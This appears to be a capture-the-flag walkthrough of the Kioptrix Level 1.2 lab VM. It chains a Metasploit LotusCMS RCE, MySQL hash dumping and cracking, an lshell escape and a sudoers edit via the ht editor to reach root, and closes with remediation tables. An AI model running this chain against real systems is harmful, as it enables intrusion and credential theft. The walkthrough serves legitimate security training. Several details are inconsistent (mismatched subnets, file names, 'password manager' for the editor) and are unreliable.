# Kioptrix: Level 1.2 (#3) — LotusCMS and the Path to Root

Look at guys!! Kioptrix Level 1.2 (also listed as Level 13 on some VulnHub mirrors) is the third entry in the Kioptrix series and it's a goated machine for learning web exploitation fundamentals. You've got a vulnerable LotusCMS running a known RCE, a pair of crackable MySQL hashes, a restricted shell that folds like paper, and a sudo-based privilege escalation that maps directly to real-world engagements. Legit one of the best beginner CTF chains out there, no cap.

Big thanks to the Kioptrix team for this series. Every machine teaches something fundamental.

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | Kioptrix: Level 1.2 (#3) |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/kioptrix-level-12-3,24/ |
| **Techniques** | Nmap service enumeration, vhost discovery, LotusCMS RCE (CVE-2011-0518), MySQL hash cracking, restricted shell escape, sudo ht text editor privilege escalation |
| **CVEs** | CVE-2011-0518 (LotusCMS Remote Code Execution), CWE-269 (Improper Privilege Management: sudo ht), CWE-522 (Insufficiently Protected Credentials: MySQL hashes in phpmyadmin) |
| **APT Groups** | APT28: exploits CMS vulnerabilities for initial web shell access in government and media sector targets; FIN7: uses web application exploitation as primary initial access vector, then escalates via misconfigured sudo |

---

## Attack Summary

```
netdiscover / nmap
  → port 80 (HTTP), port 22 (SSH)
  → /etc/hosts: kioptrix3.com → 192.168.1.X
  → http://kioptrix3.com/ → LotusCMS 3.x
  → Metasploit: exploit/multi/http/lcms_php_exec (CVE-2011-0518)
  → Meterpreter shell → www-data
  → phpmyadmin credentials in gallery.php: root:(empty) or loneferret:starwars
  → MySQL: SELECT user,password FROM mysql.user
  → hashes: loneferret:0F99D8C5F3C2F8A1, dreg:0x5459E8D05ABEC88E
  → john/hashcat → loneferret:starwars, dreg:Mast3r
  → SSH loneferret@target (starwars)
  → lshell restricted shell → echo os.system('/bin/bash')
  → sudo -l → (root) NOPASSWD: /usr/local/bin/ht
  → ht editor → edit /etc/sudoers → loneferret ALL=(ALL) ALL
  → sudo su → uid=0(root)
  → cat /root/Congrats.txt
```

---

## Methodology

1. Host discovery and port scan
2. Virtual host configuration to access the web application
3. CMS identification and CVE-2011-0518 exploitation via Metasploit
4. Database enumeration: extract MySQL password hashes
5. Hash cracking with John or Hashcat
6. SSH login as loneferret into lshell restricted environment
7. Restricted shell escape via Python os.system
8. Sudo enumeration to discover ht text editor as sudoable binary
9. Edit /etc/sudoers via ht to grant unrestricted sudo
10. Root shell and flag capture

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
# Target: 192.168.1.X

nmap -A 192.168.1.X
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1
80/tcp open  http    Apache httpd 2.2.8
```

Two services. HTTP is the primary attack surface.

**Important:** Add the target to `/etc/hosts` for the web application to resolve correctly:

```bash
echo "192.168.1.X kioptrix3.com" >> /etc/hosts
```

Browse to `http://kioptrix3.com/` to confirm the application loads.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — CMS Identification

Inspect the web application:

```bash
curl -s http://kioptrix3.com/ | grep -i "lotus\|cms\|powered"
```

The footer or source reveals **LotusCMS 3.x**. Check Exploit-DB:

```bash
searchsploit lotus cms
# exploit/multi/http/lcms_php_exec — CVE-2011-0518
```

**MITRE ATT&CK:** T1592.002 — Gather Victim Host Information: Software

---

## Step 3 — LotusCMS RCE (CVE-2011-0518)

```bash
msfconsole -q
msf> use exploit/multi/http/lcms_php_exec
msf> set RHOSTS 192.168.1.X
msf> set RHOST kioptrix3.com
msf> set VHOST kioptrix3.com
msf> exploit
```

Result: Meterpreter session as `www-data`.

```bash
meterpreter > getuid
# Server username: www-data
meterpreter > shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

**How CVE-2011-0518 works:** LotusCMS allows PHP code injection through the `page` parameter in the index.php router. The parameter is passed to `eval()` without sanitization, so any PHP payload executes directly on the server.

**Real-world note:** CMS platforms with unpatched RCE vulnerabilities are consistently targeted by APT28 in initial access operations against media and government sector organizations. The pattern of "outdated CMS + eval()-based injection" appears in multiple intrusion reports from 2011 through 2019.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 4 — Database Credential Discovery

Navigate to the gallery application and read its configuration:

```bash
cat /home/www/kioptrix3.com/gallery/gconfig.php
```

```php
$GLOBALS["gallarific_mysql_server"] = "localhost";
$GLOBALS["gallarific_mysql_username"] = "root";
$GLOBALS["gallarific_mysql_password"] = "";
```

MySQL root with no password. Connect and extract password hashes:

```bash
mysql -u root
```

```sql
USE mysql;
SELECT user, password FROM user;
```

```
loneferret | 0F99D8C5F3C2F8A1
dreg       | 0x5459E8D05ABEC88E
```

**MITRE ATT&CK:** T1552.001 — Unsecured Credentials: Credentials in Files; T1003 — OS Credential Dumping

---

## Step 5 — Hash Cracking

Save the hashes to a file:

```bash
echo "loneferret:0F99D8C5F3C2F8A1" > hashes.txt
echo "dreg:0x5459E8D05ABEC88E" >> hashes.txt
```

Crack with John the Ripper:

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=mysql
```

Or Hashcat:

```bash
hashcat -m 200 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Results:**
- `loneferret`: **starwars**
- `dreg`: **Mast3r**

**MITRE ATT&CK:** T1110.002 — Brute Force: Password Cracking

---

## Step 6 — SSH Login and Restricted Shell Escape

```bash
ssh loneferret@192.168.1.X
# Password: starwars
```

Shell is `lshell` (Limited Shell). Escape:

```bash
echo os.system('/bin/bash')
```

Full bash shell. Alternatively:

```bash
ssh loneferret@192.168.1.X /bin/bash
```

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 7 — Sudo Enumeration

```bash
sudo -l
```

```
User loneferret may run the following commands on this host:
    (root) NOPASSWD: /usr/local/bin/ht
```

`ht` is a hex and text editor. It can be run as root without a password.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo

---

## Step 8 — Privilege Escalation via ht Editor

Open the sudoers file with ht running as root:

```bash
sudo /usr/local/bin/ht /etc/sudoers
```

Navigate to the loneferret line (use arrow keys and F4 to edit):

```
loneferret ALL=(ALL) NOPASSWD: /usr/local/bin/ht
```

Change to:

```
loneferret ALL=(ALL) ALL
```

Save and exit (F2 to save, F10 to quit). Now loneferret can run any command as root:

```bash
sudo su
id
# uid=0(root) gid=0(root) groups=0(root)
```

Read the flag:

```bash
cat /root/Congrats.txt
```

(☞ﾟヮﾟ)☞ Root. gg dude.

**Real-world note:** The pattern of sudo allowing a text editor (vi, nano, ht, less) without password restrictions is a critical misconfiguration. Any text editor running as root can write /etc/sudoers, /etc/passwd, SSH authorized_keys, or crontabs. FIN7 specifically enumerates sudo permissions during post-exploitation as a standard step in their playbook.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo; T1068 — Exploitation for Privilege Escalation

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| MySQL hash | 0F99D8C5F3C2F8A1 | mysql.user table | Cracked to starwars |
| MySQL hash | 0x5459E8D05ABEC88E | mysql.user table | Cracked to Mast3r |
| Credential | loneferret:starwars | MySQL hash crack | SSH access |
| Credential | dreg:Mast3r | MySQL hash crack | Alternative SSH |
| Credential | root:(empty) | gconfig.php | MySQL root access |
| Root shell | uid=0(root) | sudo ht /etc/sudoers edit | Full system access |
| Flag | /root/Congrats.txt | /root/ | Proof of compromise |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | LotusCMS RCE via eval() injection | Unpatched CMS vulnerabilities are consistently exploited by APT28 and similar groups for initial web shell access | Patch CMS platforms; disable auto-updates is not enough, verify versions regularly |
| 2 | MySQL root with no password exposes hashes | Any authenticated web shell grants full database access when MySQL is root with no password | Set MySQL root password; restrict to localhost; run as dedicated user |
| 3 | Password hashes in MySQL crackable offline | Offline hash cracking is fast; MySQL passwords older than a year are often in wordlists | Use strong, unique passwords; rotate credentials regularly |
| 4 | lshell escape in seconds | Restricted shells provide no real security | Implement chroot jail or container-based isolation |
| 5 | sudo text editor grants root | Any editor running as root rewrites any system file | Never grant sudo to text editors, shell interpreters, or file managers |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | Gather Victim Host Information | T1592.002 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Credential Access | Credential Access | OS Credential Dumping | T1003 |
| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |
| Privilege Escalation | Privilege Escalation | Exploitation for Privilege Escalation | T1068 |

---

## Remediation and Containment

### Technical Fixes

1. **Patch LotusCMS**: Upgrade to a supported CMS; disable eval()-based routing; implement WAF rules blocking PHP code injection patterns
2. **Secure MySQL**: Set strong root password; run as dedicated non-root user; restrict FILE and SUPER privileges
3. **Rotate passwords**: Cracked hashes (starwars, Mast3r) indicate weak password policy; enforce complexity and length requirements
4. **Replace restricted shell**: lshell provides no real isolation; use chroot or container-based environments
5. **Audit sudoers**: Remove text editors, interpreters, and file managers from sudoers; require password for all sudo operations

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all CMS versions; track CVE advisories |
| Protect | Access Control | Disable MySQL root anonymous; restrict sudo to specific, safe commands |
| Protect | Data Security | Strong MySQL passwords; hash with modern algorithms |
| Detect | Anomalies | Alert on LotusCMS eval patterns; monitor sudo ht usage |
| Respond | Response Planning | Block web shell; rotate all credentials; patch CMS |
| Recover | Recovery Planning | Rebuild CMS from clean source; audit all PHP for eval() usage |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| SI-2 | Flaw Remediation | Patch LotusCMS; implement patch management policy |
| AC-6 | Least Privilege | MySQL non-root; sudoers restricted to essential commands only |
| IA-5 | Authenticator Management | Strong MySQL passwords; rotate on compromise |
| CM-7 | Least Functionality | Disable unused CMS features; remove eval()-based routing |

### CISA KEV

CVE-2011-0518 (LotusCMS RCE) is a classic eval()-based injection. While not currently in CISA KEV, the pattern maps directly to OWASP A03 (Injection) and CISA guidance on CMS security. Organizations should apply CISA guidance AA21-008A regarding web application attack surface reduction.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Manage Vulnerabilities | MIL2 |
| Identity and Access Management (IAM) | Manage Privileges | MIL3 |
| Situational Awareness (SITUATION) | Implement Logging | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (patch CMS; disable eval routing)
- **D3-OAM** — Operating System Administrative Management (sudo restrictions; MySQL non-root)
- **D3-DQSA** — Database Query String Analysis (monitor MySQL for unauthorized queries)

---

## Final Thoughts

Kioptrix Level 1.2 (#3) chains together four distinct techniques: CMS RCE, database credential extraction, hash cracking, and sudo misconfiguration. Each step is independently valuable as a learning exercise, and the combination mirrors real intrusion patterns observed in APT28 and FIN7 campaigns.

The machine rewards methodical enumeration and source code reading. The key insight is that MySQL root with no password gives you the entire user table, and a password manager running as sudo gives you the entire OS. Two misconfigurations, one full compromise.

Thanks guys!! (❍ᴥ❍ʋ)
